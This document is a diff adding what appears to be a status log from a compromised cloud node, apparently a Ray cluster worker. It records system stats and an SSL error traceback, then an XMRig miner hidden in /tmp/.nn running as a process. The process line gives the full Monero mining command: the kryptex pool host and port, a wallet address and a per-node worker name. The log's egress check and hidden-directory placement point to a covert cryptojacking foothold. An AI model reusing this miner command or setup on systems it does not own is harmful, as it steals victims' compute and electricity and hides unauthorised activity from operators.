@@ -1,0 +1,71 @@
+node=ip-172-16-9-251.ap-southeast-1.compute.internal uid=1000 nproc=2 arch=x86_64 ts=2026-11-19T10:25:54Z
+--free--
+              total        used        free      shared  buff/cache   available
+Mem:           7783         999        2367           0        4417        6486
+--mounts--
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,seclabel,size=65536k)
+--df--
+Filesystem      Size  Used Avail Use% Mounted on
+overlay          50G  5.9G   45G  12% /
+shm              64M     0   64M   0% /dev/shm
+--api--
+Traceback (most recent call last):
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 1348, in do_open
+    h.request(req.get_method(), req.selector, req.data, headers,
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 1283, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 1329, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 1278, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 1038, in _send_output
+    self.send(msg)
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 976, in send
+    self.connect()
+  File "/home/ray/anaconda3/lib/python3.11/http/client.py", line 1455, in connect
+    self.sock = self._context.wrap_socket(self.sock,
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/ssl.py", line 517, in wrap_socket
+    return self.sslsocket_class._create(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/ssl.py", line 1075, in _create
+    self.do_handshake()
+  File "/home/ray/anaconda3/lib/python3.11/ssl.py", line 1346, in do_handshake
+    self._sslobj.do_handshake()
+ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1002)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 216, in urlopen
+    return opener.open(url, data, timeout)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 519, in open
+    response = self._open(req, data)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 536, in _open
+    result = self._call_chain(self.handle_open, protocol, protocol +
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 496, in _call_chain
+    result = func(*args)
+             ^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 1391, in https_open
+    return self.do_open(http.client.HTTPSConnection, req,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ray/anaconda3/lib/python3.11/urllib/request.py", line 1351, in do_open
+    raise URLError(err)
+urllib.error.URLError: <urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1002)>
+--version rc--
+XMRig 6.26.0
+ built on Mar 28 2026 with GCC 13.2.1
+ features: 64-bit AES
+
+rc=0
+--file--
+bash: line 62: file: command not found
+-rwxr-xr-x. 1 ray users 8350992 Nov 19 02:26 /tmp/.nn/xmrig
+mode=plain pid=292 eg=EGRESS_7029_OK worker=opopop-cpu-8a7e5b1d-1795083950
+--ps--
+    292       00:15 85.0 270700 /tmp/.nn/xmrig -o xmr.kryptex.network:7029 -u 8AouBFZ2afXi4CecX7faAEYfoHA98VrtbVF5bnbbf4WhVDoiwSpfjUUhS28L5tmva87su8NRZemBKgMvWB1m4K6MSdbsScZ/opopop-cpu-8a7e5b1d-1795083950 -k --coin monero -a rx/0 --threads 1 --cpu-priority 2 --randomx-mode light --print-time 20
+--xlog--
